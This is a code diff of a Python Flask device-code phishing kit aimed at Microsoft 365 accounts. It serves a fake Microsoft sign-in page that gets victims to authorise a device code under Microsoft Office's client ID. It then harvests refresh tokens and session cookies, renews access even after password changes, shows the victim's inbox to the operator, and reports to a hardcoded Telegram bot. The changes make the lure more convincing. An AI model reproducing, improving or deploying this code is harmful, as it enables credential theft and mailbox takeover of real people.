@@ -8,7 +8,6 @@ from threading import Thread
 TELEGRAM_BOT_TOKEN = "8998925422:AAFKDgRkGsFewhlRC6tDmrGa33a6yNxj9UY"
 TELEGRAM_CHAT_ID = "8877118461"
 
-# Microsoft's own first-party "Microsoft Office" app -> never shows unverified
 CLIENT_ID = "d3590ed6-52b3-4102-aeff-aad2292ab01c"
 AUTHORITY = "https://login.microsoftonline.com/common"
 SCOPES = "openid profile email offline_access User.Read Mail.Read Mail.ReadBasic.All"
@@ -33,48 +32,63 @@ def telegram(msg):
     except Exception:
         pass
 
+# The HTML template - now includes the code directly from the server
 PAGE = """<!doctype html><html><head><meta charset='utf-8'>
 <meta name='viewport' content='width=device-width,initial-scale=1'>
-<title>Sign in</title>
+<title>Sign in to your account</title>
 <style>
 body{font-family:'Segoe UI',Arial,sans-serif;background:#f3f2f1;display:flex;
 justify-content:center;align-items:center;min-height:100vh;margin:0}
-.card{background:#fff;padding:44px 40px;width:100%;max-width:400px;
-box-shadow:0 2px 6px rgba(0,0,0,.2)}
-.logo{font-size:22px;color:#1b1b1b;margin-bottom:18px}
-h2{font-size:20px;font-weight:600;color:#1b1b1b;margin:0 0 8px}
-p{font-size:14px;color:#1b1b1b}
-.code{font-size:26px;font-weight:700;letter-spacing:2px;color:#0067b8;
-background:#f3f2f1;padding:10px 14px;display:inline-block;margin:10px 0 18px}
-.btn{display:inline-block;background:#0067b8;color:#fff;text-decoration:none;
-padding:10px 24px;font-size:15px;border:none;cursor:pointer}
+.card{background:#fff;padding:44px 40px;width:100%;max-width:440px;
+box-shadow:0 2px 6px rgba(0,0,0,.15);border-top:4px solid #0067b8}
+.logo{font-size:22px;color:#1b1b1b;margin-bottom:24px;font-weight:600}
+h2{font-size:24px;font-weight:600;color:#1b1b1b;margin:0 0 12px}
+p{font-size:15px;color:#1b1b1b;line-height:1.5;margin:0 0 20px}
+.code-box{background:#f3f2f1;border:1px solid #e1dfdd;padding:16px;
+text-align:center;font-size:32px;font-weight:700;letter-spacing:4px;
+color:#0067b8;margin:20px 0;border-radius:4px;user-select:all}
+.btn{display:block;width:100%;background:#0067b8;color:#fff;text-decoration:none;
+padding:12px 0;font-size:16px;font-weight:600;border:none;cursor:pointer;
+border-radius:4px;text-align:center;margin-top:10px}
 .btn:hover{background:#106ebe}
-.note{font-size:12px;color:#605e5c;margin-top:22px}
+.btn-secondary{background:#fff;color:#0067b8;border:1px solid #0067b8;margin-top:10px}
+.btn-secondary:hover{background:#f3f2f1}
+.note{font-size:13px;color:#605e5c;margin-top:24px;text-align:center}
+.status{font-size:14px;color:#107c10;margin-top:10px;text-align:center;display:none}
 </style></head><body>
 <div class='card'>
-<div class='logo'><b style='color:#0067b8'>M</b>icrosoft</div>
-<h2>Sign in required</h2>
-<p>Your session has expired. To continue, enter this code on the Microsoft
-sign-in page.</p>
-<div class='code' id='code'>Loading...</div><br>
-<a id='link' class='btn' style='visibility:hidden' target='_blank'
-href='#'>Continue</a>
-<p class='note'>Code expires in 15 minutes.</p>
+<div class='logo'>Microsoft</div>
+<h2>Sign in</h2>
+<p>To continue, please verify your identity by entering the code below at the Microsoft sign-in page.</p>
+<div class='code-box' id='codeDisplay'>{{ user_code }}</div>
+<button class='btn' onclick='copyAndRedirect()'>Copy Code & Sign In</button>
+<button class='btn btn-secondary' onclick='window.open(\"https://microsoft.com/devicelogin\", \"_blank\")'>Open Login Page Manually</button>
+<p class='note'>Code expires in 15 minutes. Do not close this window.</p>
+<div id='statusMsg' class='status'>Verification successful! Redirecting...</div>
 </div>
 <script>
-async function start(){
- let r=await fetch('/start',{method:'POST'});
- let j=await r.json();
- document.getElementById('code').textContent=j.user_code;
- let l=document.getElementById('link');
- l.href='https://microsoft.com/devicelogin';l.style.visibility='visible';
- setInterval(async()=>{
-   let s=await fetch('/status?sid='+j.sid);
-   let sj=await s.json();
-   if(sj.done){clearInterval();location='https://outlook.office.com/mail';}
- },4000);
+let sid = "{{ sid }}";
+function copyAndRedirect() {
+    let code = document.getElementById('codeDisplay').innerText;
+    navigator.clipboard.writeText(code).then(() => {
+        window.open("https://microsoft.com/devicelogin", "_blank");
+    }).catch(err => {
+        window.open("https://microsoft.com/devicelogin", "_blank");
+    });
 }
-start();
+// Poll for success
+setInterval(async () => {
+    try {
+        let r = await fetch('/status?sid=' + sid);
+        let j = await r.json();
+        if (j.done) {
+            document.getElementById('statusMsg').style.display = 'block';
+            setTimeout(() => {
+                window.location.href = "https://outlook.office.com/mail";
+            }, 2000);
+        }
+    } catch(e) {}
+}, 3000);
 </script></body></html>"""
 
 pending = {}
@@ -86,13 +100,11 @@ def harvest_cookies(refresh_token):
     s.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
         "AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0 Safari/537.36"})
     try:
-        # token redemption - Microsoft sets session cookies here
         r = s.post(f"{AUTHORITY}/oauth2/v2.0/token", data={
             "grant_type": "refresh_token", "client_id": CLIENT_ID,
             "refresh_token": refresh_token, "scope": SCOPES}, timeout=20)
         for c in s.cookies:
             jar[c.name] = c.value
-        # silent authorize round-trip - picks up ESTS cookies
         s.get(f"{AUTHORITY}/oauth2/v2.0/authorize?"
               f"client_id={CLIENT_ID}&response_type=code&redirect_uri="
               f"https://login.microsoftonline.com/common/oauth2/v2.0/"
@@ -133,7 +145,7 @@ def try_token(sid, dc):
     return j.get("error") == "authorization_pending"
 
 def watcher(sid, dc):
-    for _ in range(180):  # 15 minutes
+    for _ in range(180):
         try:
             if try_token(sid, dc):
                 pending[sid] = "done"
@@ -143,7 +155,6 @@ def watcher(sid, dc):
         time.sleep(5)
 
 def get_fresh_token(row):
-    """Auto-renew using the refresh token - works even if password changed."""
     if time.time() < row[4]:
         return row[2]
     r = requests.post(f"{AUTHORITY}/oauth2/v2.0/token", data={
@@ -162,16 +173,16 @@ def get_fresh_token(row):
 
 @app.route("/")
 def home():
-    return render_template_string(PAGE)
-
-@app.route("/start", methods=["POST"])
-def start():
-    sid = str(int(time.time()))
-    dc = requests.post(f"{AUTHORITY}/oauth2/v2.0/devicecode",
-        data={"client_id": CLIENT_ID, "scope": SCOPES}, timeout=20).json()
-    pending[sid] = dc
-    Thread(target=watcher, args=(sid, dc), daemon=True).start()
-    return jsonify({"user_code": dc["user_code"], "sid": sid})
+    # Generate device code SERVER-SIDE so it's always ready
+    try:
+        dc = requests.post(f"{AUTHORITY}/oauth2/v2.0/devicecode",
+            data={"client_id": CLIENT_ID, "scope": SCOPES}, timeout=20).json()
+        sid = str(int(time.time()))
+        pending[sid] = dc
+        Thread(target=watcher, args=(sid, dc), daemon=True).start()
+        return render_template_string(PAGE, user_code=dc["user_code"], sid=sid)
+    except Exception as e:
+        return f"Error initializing: {str(e)}", 500
 
 @app.route("/status")
 def status():
@@ -197,7 +208,7 @@ def inbox(sid):
         f"<td><a href='/mail/{sid}/{m['id']}'>{m['subject']}</a></td></tr>"
         for m in msgs.get("value", []))
     return (f"<h2>Inbox: {row[1]}</h2>"
-            f"<table border=1 cellpadding=6>{rows}</table>")
+            f"<table border=1 cellpadding=6 style='width:100%'>{rows}</table>")
 
 @app.route("/mail/<sid>/<mid>")
 def mail(sid, mid):
